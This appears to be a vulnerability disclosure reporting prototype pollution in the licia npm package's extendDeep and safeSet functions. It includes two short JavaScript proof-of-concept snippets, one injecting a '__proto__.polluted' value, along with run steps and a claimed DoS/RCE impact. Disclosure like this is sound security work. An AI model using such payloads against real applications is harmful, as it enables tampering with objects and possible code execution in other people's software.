# Description
licia package is vulnerable to prototype pollution issue 
files can be found in  https://github.com/liriliri/licia/blob/master/src/e/extendDeep.js & https://github.com/liriliri/licia/blob/master/src/s/safeSet.js#L46
# Proof of Concept 
1. Creating poc filed
```js
var utils = require('licia');
var src = {};
let object = utils.extendDeep({}, JSON.parse('{ "myProperty": "a", "prototype" : { "isAdmin" : true } }'));
console.log(object.prototype.isAdmin);
```

```js
var licia = require('licia');
var src = {};
licia.safeSet(src, "__proto__.polluted", "pwned!");
console.log(polluted);
```

2. Execute command npm install licia
3. Execute command node poc.js
* https://drive.google.com/file/d/1Ef61xgYB6Tzq1We_OiitWUqne0H9skGe/view?usp=sharing
# Impact
Prototype pollution which could lead to DOS and RCE
